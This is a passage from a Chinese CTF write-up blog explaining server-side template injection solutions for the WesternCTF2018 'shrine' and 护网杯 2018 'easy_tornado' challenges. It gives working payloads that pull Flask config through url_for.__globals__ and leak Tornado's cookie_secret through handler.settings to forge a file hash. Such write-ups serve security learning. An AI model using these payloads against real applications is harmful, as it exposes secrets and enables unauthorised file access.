<li><p><strong>作为对象的属性：</strong> <code>current_app.config</code> —— 这里的 <code>config</code> 是 <code>current_app</code> 这个对象内部的一个<strong>属性（Key）</strong>。</p>
</li>
<li><p>当你访问 <code>current_app.config</code> 时：</p>
<ol>
<li>模板引擎先找到了 <code>current_app</code> 这个对象（它不在黑名单里）。</li>
<li>然后去读取这个对象内部的 <code>config</code> 属性。</li>
<li>这个属性指向的是内存中真实的配置字典，它<strong>没有</strong>被改成 <code>None</code>。</li>
</ol>
</li>
</ul>
<p>1.构造payload</p>
<p>需要通过一个“绕路”的 Payload 来找回被设为 None 的 <code>config</code>（里面有flag）</p>
<p><strong>推荐 Payload：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123; url_for.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;] &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>url_for</code>：这是一个 Flask 自带的函数，代码没禁用它。</p>
<p><code>.__globals__</code>：获取这个函数运行时的全局环境。</p>
<p><code>[&#39;current_app&#39;]</code>：在全局环境里找到当前正在运行的这个 <code>app</code> 对象。</p>
<p><code>.config[&#39;FLAG&#39;]</code>：既然找到了 <code>app</code>，自然就能点出它的 <code>config</code>，从而拿到 Flag。</p>
<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p>一进去三个连接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">/welcome.txt</span><br><span class="line">/hints.txt</span><br></pre></td></tr></table></figure>



<p><strong>第一步：观察</strong></p>
<p>点击获得：</p>
<ol>
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/welcome.txt&lt;br&gt;render</span><br></pre></td></tr></table></figure>

<p>说明这里是一个ssti注入模板。</p>
<p>在 Python 的 Web 开发（特别是 Tornado、Flask、Django）中，<code>render</code> 系列函数的功能是：<strong>将代码逻辑和 HTML 模板“缝合”在一起。</strong></p>
<ul>
<li><strong>正常用法：</strong> 程序员写死模板，只让你填数据（如用户名）。</li>
<li><strong>漏洞用法：</strong> 程序员把<strong>你输入的内容</strong>直接丢进 <code>render</code> 函数里处理。</li>
</ul>
<p>由于 <code>render</code> 具有<strong>执行指令</strong>的能力，如果你输入了 <code>{{ ... }}</code> 格式的内容，<code>render</code> 就会把它当成代码去执行，而不是当成普通的文字显示。</p>
<ol start="2">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/hints.txt&lt;br&gt;md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>

<p>处理逻辑：把文件名md5和cookie拼接起来，然后再整体md5</p>
<ol start="3">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt&lt;br&gt;flag in /fllllllllllllag</span><br></pre></td></tr></table></figure>

<p>找到文件名</p>
<p>md5(cookie_secret+md5(3bf9f6cf685a6dd8defadabfb41a03a1))</p>
<p>还差cookie</p>
<p>4.还得到了三个url</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /file?filename=/welcome.txt&amp;filehash=1b63a9ae097b47187135a844d4eafcfd</span><br><span class="line">GET /file?filename=/flag.txt&amp;filehash=a52b1928deff4c626d099883429dbcb4</span><br><span class="line">GET /file?filename=/hints.txt&amp;filehash=637657bcdc2a447924cb73ee504343f2</span><br></pre></td></tr></table></figure>

<p>那么我们发现：</p>
<p>第一，是小写32位哈希；</p>
<p>第二，MAC（Message Authentication Code，消息认证码）：所有我们传入的文件名都会和cookie一起md5解析，若被服务器验证正确，你就可以读取想要的文件。</p>
<p><strong>第二步：找cookie</strong></p>
<p>抓包并没有发现cookie，但是我们可以通过报错得到一些信息，或许信息里面就有cookie ？</p>
<p>知识点：Tornado 框架的特性 (The Key)</p>
<p>每一个 Web 框架在处理模板时，都会默认提供一些<strong>内置对象</strong>。</p>
<ul>
<li><p>在 <strong>Tornado</strong> 框架中，模板引擎可以直接访问一个叫 <code>handler</code> 的对象。</p>
</li>
<li><p><strong><code>handler</code> 对象：</strong> </p>
<p>它代表了当前处理请求的实例，它能够访问到整个 <code>application</code> 的设置。（所有的配置信息cookie_secret<code>都存储在 </code>self.<code>application</code>.settings里面。）</p>
<p>访问方式：可以通过 <code>handler.settings</code> 访问</p>
</li>
</ul>
<p>这里的逻辑是：</p>
<p>先找到一个可以注入的入口，然后放进去 handler.setting ，通过回显拿到cookie</p>
<p>怎么找入口（也就是可以打印和处理你输入的页面）？：</p>
<p><strong>利用“报错重定向”发现入口</strong></p>
<ul>
<li><strong>在主页乱传参：</strong> 无效。因为主页的后端代码（Handler）没写读取参数的功能</li>
<li><strong>在 <code>/file</code> 传参：</strong> 有效。这里的后端代码<strong>必须</strong>处理 <code>filename</code>。当你传一个不存在的 <code>aaa</code> 或错误的 <code>hash</code> 时，代码运行出错，触发了“异常处理”。</li>
<li><strong>发现重定向：</strong> 服务器自动把你踢到了 <code>/error?msg=Error</code>。这说明 <code>/error</code> 页面专门负责显示错误信息。</li>
</ul>
<p>利用报错重定向回显：如果你乱传参的话，他就没办法处理你的输入，那么就会把东西都扔到一个专门处理错误的地方。</p>
<p>通过&#x2F;file?filename&#x3D;传入aaa，可以得到处理错误的地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=Error</span><br></pre></td></tr></table></figure>

<p>那么就得到了这个入口，进去之后的msg就是注入点</p>
<p><img src="/images/image-20260118094751344.png" alt="image-20260118094751344"></p>
<p>我们试试其他：</p>
<p><img src="/images/image-20260118094913939.png" alt="image-20260118094913939"></p>
<p><img src="/images/image-20260118094946270.png" alt="image-20260118094946270"></p>
<p>说明有过滤</p>
<p>但是没关系，试试看handler.settings</p>
<p><img src="/images/image-20260118095107239.png" alt="image-20260118095107239"></p>
<p>得到cookie！</p>
<p>0ba70d95-2474-4ced-b2e4-52d8473aca2a</p>
<p>按照之前的处理逻辑拼接加编码即可：</p>
<p>md5(cookie_secret+md5(3bf9f6cf685a6dd8defadabfb41a03a1))</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d6c816597dd95fed7b3e9e6b1a5976ad</span><br><span class="line"></span><br><span class="line">url：</span><br><span class="line">/file?filename=/fllllllllllllag&amp;filehash=d6c816597dd95fed7b3e9e6b1a5976ad</span><br></pre></td></tr></table></figure>





</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://2829750658t-svg.github.io">qyt</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://2829750658t-svg.github.io/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/sstizhuru/">https://2829750658t-svg.github.io/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/sstizhuru/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://2829750658t-svg.github.io" target="_blank">24kmagic</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ssti%E6%B3%A8%E5%85%A5/">ssti注入</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/images/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/images/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/images/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/images/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/xss/" title="web-xss"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">web-xss</div></div><div class="info-2"><div class="info-item-1">web-xss1.反射型（外部输入后，在浏览器端输出触发） 2.存储型（东西存在文件中，web程序读取代码并输出） 知识点1： html实体编码： HTML 实体编码 的规则是： &amp;# + 十进制 ASCII 码 + ;  字母 r 的十进制 ASCII 码是 114。 所以它的 HTML 实体编码就是 r。  CSRF：到底是什么？ 黑客没偷你的证件（他拿不到 Cookie）。 黑客只是骗你点了一下按钮（利用了你还在登录状态的权限）。 结果： 在你完全不知情的情况下，你的身份被黑客**“借用”**了。 举例： &lt;img= src=1 oner&amp;#114;or=ale&amp;#114;t(1)&gt; 知识点2： Referer 是看你从哪来。 Token 是看你带没带暗号。  Sec-Fetch  Sec: 是 Security（安全）的缩写。 Fetch: 翻译为 “获取” 或 “抓取”（在编程里指代发起一个网络请求）。 合起来的意思： “安全获取元数据”（Security Fetch Metadata）。  它是浏览器在发起请求时，自动给服务器打的“...</div></div></div></a><a class="pagination-related" href="/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/ssrf/" title="web-ssrf"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">web-ssrf</div></div><div class="info-2"><div class="info-item-1">web-ssrfSSRF &#x3D; 服务器端请求伪造特点 主体是服务器：请求是「服务器发起」的，不是你的电脑； 权限是服务器的权限：服务器能访问的资源（本地文件、内网 IP），你本来访问不到，但通过 SSRF 就能间接访问； 核心是 “伪造请求”：你伪造一个服务器会执行的请求（比如本地文件地址、内网地址），服务器替你执行。  [网鼎杯 2018]Fakebook11.注册登陆界面，sqlmap扫描 1python dirsearch.py -u &quot;http://3992b9c4-b99e-44db-96b6-111d3cb92681.node5.buuoj.cn:81/&quot; -e php --threads 1 --delay 3 -w ./ctf_core.txt      打开备份文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo&#123;    public $name = &quot;&quo...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">qyt</div><div class="author-info-description">不要放弃自由去选择保障，到头来你两者都得不到</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/2829750658t-svg" target="_blank" title="GitHub"><i class="fab fa-github"></i></a><a class="social-icon" href="https://www.zhihu.com/people/7e5acf574f89c3cba9460c739673e2cf" target="_blank" title="知乎"><i class="fab fa-zhihu"></i></a><a class="social-icon" href="https://xhslink.com/m/2t0Ndc1uvYL" target="_blank" title="小红书"><i class="fas fa-notes-medical"></i></a><a class="social-icon" href="https://163cn.tv/Z9ohElT" target="_blank" title="网易云音乐"><i class="fas fa-music"></i></a><a class="social-icon" href="https://www.instagram.com/tenyeahqweyeah?igsh=NG92enl2NTE0NGMx&amp;utm_source=qr" target="_blank" title="Instagram"><i class="fab fa-instagram"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">很高兴能向你展示我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-ssti%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">web-ssti注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%88%9D%E6%AD%A5https-hello-ctf-com-hc-web-ssti-1"><span class="toc-number">1.1.</span> <span class="toc-text">模板注入初步https:&#x2F;&#x2F;hello-ctf.com&#x2F;hc-web&#x2F;ssti&#x2F;#_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ProbiusOfficial-Hello-CTF"><span class="toc-number">1.2.</span> <span class="toc-text">ProbiusOfficial&#x2F;Hello-CTF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%C2%B6"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%A1%E6%9D%BF%C2%B6"><span class="toc-number">2.1.</span> <span class="toc-text">什么是模板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%C2%B6"><span class="toc-number">2.2.</span> <span class="toc-text">什么是模板注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B%C2%B6"><span class="toc-number">3.</span> <span class="toc-text">Python模板注入一般流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%C2%B6"><span class="toc-number">3.1.</span> <span class="toc-text">引</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A5%E6%9D%A5%E6%9D%A5%EF%BC%8C%E5%88%86%E7%B1%BB%EF%BC%8C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E7%94%A8%E4%BB%80%E4%B9%88%E8%AF%B7%E7%9C%8B%E5%A5%BD"><span class="toc-number">3.2.</span> <span class="toc-text">来来来，分类，什么时候用什么请看好</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%86%E8%AE%B2twig%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">细讲twig注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">4.1.</span> <span class="toc-text">1. 测试流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8EPayload"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞利用与Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%9D%9E%E6%B2%99%E7%9B%92%E6%A8%A1%E5%BC%8F"><span class="toc-number">4.3.</span> <span class="toc-text">1. 非沙盒模式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E9%9C%80exec%E5%87%BD%E6%95%B0%E5%8F%AF%E7%94%A8%EF%BC%89"><span class="toc-number">4.3.1.</span> <span class="toc-text">命令执行（需exec函数可用）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">4.3.2.</span> <span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-self%E5%AF%B9%E8%B1%A1%EF%BC%88%E6%97%A7%E7%89%88%E6%9C%AC%EF%BC%89"><span class="toc-number">4.3.3.</span> <span class="toc-text">利用_self对象（旧版本）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">4.4.</span> <span class="toc-text">2. 沙盒绕过技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%86%85%E7%BD%AE%E8%BF%87%E6%BB%A4%E5%99%A8%E9%93%BE"><span class="toc-number">4.4.1.</span> <span class="toc-text">使用内置过滤器链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%B1%9E%E6%80%A7%E6%B3%A8%E5%85%A5"><span class="toc-number">4.4.2.</span> <span class="toc-text">利用属性注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E7%BB%A7%E6%89%BF%E6%94%BB%E5%87%BB"><span class="toc-number">4.4.3.</span> <span class="toc-text">模板继承攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%85%B6%E4%BB%96Payload"><span class="toc-number">4.5.</span> <span class="toc-text">3. 其他Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5"><span class="toc-number">5.</span> <span class="toc-text">四、防御手段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AE%98%E6%96%B9%E6%8E%A8%E8%8D%90"><span class="toc-number">5.1.</span> <span class="toc-text">1. 官方推荐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-number">5.2.</span> <span class="toc-text">2. 安全配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">6.</span> <span class="toc-text">五、绕过技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="toc-number">6.1.</span> <span class="toc-text">1. 字符串拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8attribute%E5%87%BD%E6%95%B0"><span class="toc-number">6.2.</span> <span class="toc-text">2. 利用attribute函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%B8%8A%E4%B8%8B%E6%96%87%E9%80%83%E9%80%B8"><span class="toc-number">6.3.</span> <span class="toc-text">3. 上下文逃逸</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#moectf-web-20-%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0-%E5%B9%BD%E5%86%A5%E8%A1%80%E6%B5%B7%C2%B7%E5%B9%BB%E8%AF%AD%E5%BF%83%E9%AD%94"><span class="toc-number">7.</span> <span class="toc-text">moectf web 20 第二十章 幽冥血海·幻语心魔</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%A0%E4%B8%BAusername-%E8%A6%81%E7%95%99%E4%BD%9C-%E2%80%9C%E6%B3%A8%E5%85%A5%E4%BD%8D%E2%80%9D%EF%BC%8C%E4%B8%8D%E8%83%BD%E5%86%99%E6%AD%BB%E4%B8%BA1"><span class="toc-number">7.1.</span> <span class="toc-text">因为username 要留作 “注入位”，不能写死为1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%BE%80%E7%94%9F%E6%BC%A9%E6%B6%A1%C2%B7%E8%A8%80%E7%81%B5%E6%AD%BB%E5%B1%80"><span class="toc-number">8.</span> <span class="toc-text">21 第二十一章 往生漩涡·言灵死局</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#moectf-web-22-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E7%AB%A0-%E8%A1%80%E6%B5%B7%E6%A0%B8%E5%BF%83%C2%B7%E5%8D%83%E5%B9%B4%E6%89%8B%E6%AE%B5"><span class="toc-number">9.</span> <span class="toc-text">moectf web 22 第二十二章 血海核心·千年手段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2%EF%BC%9A%E6%A0%B8%E5%BF%83%EF%BC%9AWAF-%E5%8F%AA%E8%AE%A4-%E2%80%9C%E7%9B%B4%E6%8E%A5%E5%B9%B2%E5%9D%8F%E4%BA%8B%E2%80%9D-%E7%9A%84%E8%AF%B7%E6%B1%82%EF%BC%8C%E4%B8%8D%E8%AE%A4-%E2%80%9C%E5%81%B7%E5%81%B7%E5%9F%8B%E9%9B%B7-%E5%90%8E%E6%9C%9F%E8%A7%A6%E5%8F%91%E2%80%9D-%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="toc-number">9.1.</span> <span class="toc-text">1+2：核心：WAF 只认 “直接干坏事” 的请求，不认 “偷偷埋雷 + 后期触发” 的操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-Cookie-is-so-stable"><span class="toc-number">10.</span> <span class="toc-text">[BJDCTF2020]Cookie is so stable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%AC%AC%E4%B8%80%E9%81%93%E7%94%B1%E6%88%91%E8%87%AA%E5%B7%B1%E6%89%BE%E5%88%B0%E6%80%9D%E8%B7%AF%E7%9A%84%E9%A2%98%E7%9B%AE%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%E7%BB%93%E6%9E%9C%E5%8F%91%E7%8E%B0%E6%80%9D%E8%B7%AF%E4%B8%8D%E6%98%AF%E5%BE%88%E5%A5%BD%E3%80%82%E3%80%82%E3%80%82%E3%80%82"><span class="toc-number">10.1.</span> <span class="toc-text">1 第一道由我自己找到思路的题目！！！！！！！！！结果发现思路不是很好。。。。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-do-you-want-to-do"><span class="toc-number">11.</span> <span class="toc-text">What do you want to do?!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WesternCTF2018-shrine"><span class="toc-number">12.</span> <span class="toc-text">[WesternCTF2018]shrine</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">12.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-current-app-config-%E8%BF%98%E8%83%BD%E7%94%A8%EF%BC%9F"><span class="toc-number">12.2.</span> <span class="toc-text">为什么 current_app.config 还能用？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-number">13.</span> <span class="toc-text">[护网杯 2018]easy_tornado</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1"><span class="toc-number">13.1.</span> <span class="toc-text">1</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/23/my-article/" title="my-article">my-article</a><time datetime="2026-01-23T03:41:18.000Z" title="发表于 2026-01-23 11:41:18">2026-01-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/ctf%E5%AD%A6%E4%B9%A0/web/ssrf/" title="ssrf">ssrf</a><time datetime="2026-01-21T11:56:05.000Z" title="发表于 2026-01-21 19:56:05">2026-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/ctf%E9%A2%98%E8%A7%A3/crypto/codetijie/" title="codetijie">codetijie</a><time datetime="2026-01-21T11:56:05.000Z" title="发表于 2026-01-21 19:56:05">2026-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/ctf%E5%AD%A6%E4%B9%A0/web/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="逻辑漏洞">逻辑漏洞</a><time datetime="2026-01-21T11:56:05.000Z" title="发表于 2026-01-21 19:56:05">2026-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/ctf%E5%AD%A6%E4%B9%A0/web/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">内网渗透</a><time datetime="2026-01-21T11:56:05.000Z" title="发表于 2026-01-21 19:56:05">2026-01-21</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By qyt</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'

  const createScriptElement = config => {
    const ele = document.createElement('script')
    Object.entries(config).forEach(([key, value]) => {
      ele.setAttribute(key, value)
    })
    return ele
  }

  const loadGiscus = (el = document, key) => {
    const mappingConfig = isShuoshuo
      ? { 'data-mapping': 'specific', 'data-term': key }
      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }

    const giscusConfig = {
      src: 'https://giscus.app/client.js',
      'data-repo': '2829750658t-svg/2829750658t-svg.github.io',
      'data-repo-id': 'R_kgDOQS61dQ',
      'data-category-id': 'DIC_kwDOQS61dc4C1UR-',
      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
      'data-reactions-enabled': '1',
      crossorigin: 'anonymous',
      async: true,
      ...option,
      ...mappingConfig
    }

    const scriptElement = createScriptElement(giscusConfig)

    el.querySelector('#giscus-wrap').appendChild(scriptElement)

    if (isShuoshuo) {
      window.shuoshuoComment.destroyGiscus = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }
  }

  const changeGiscusTheme = theme => {
    const iframe = document.querySelector('#giscus-wrap iframe')
    if (iframe) {
      const message = {
        giscus: {
          setConfig: {
            theme: getGiscusTheme(theme)
          }
        }
      }
      iframe.contentWindow.postMessage(message, 'https://giscus.app')
    }
  }

  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')

  if (isShuoshuo) {
    'Giscus' === 'Giscus'
      ? window.shuoshuoComment = { loadComment: loadGiscus }
      : window.loadOtherComment = loadGiscus
    return
  }

  if ('Giscus' === 'Giscus' || !false) {
    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
    else loadGiscus()
  } else {
    window.loadOtherComment = loadGiscus
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>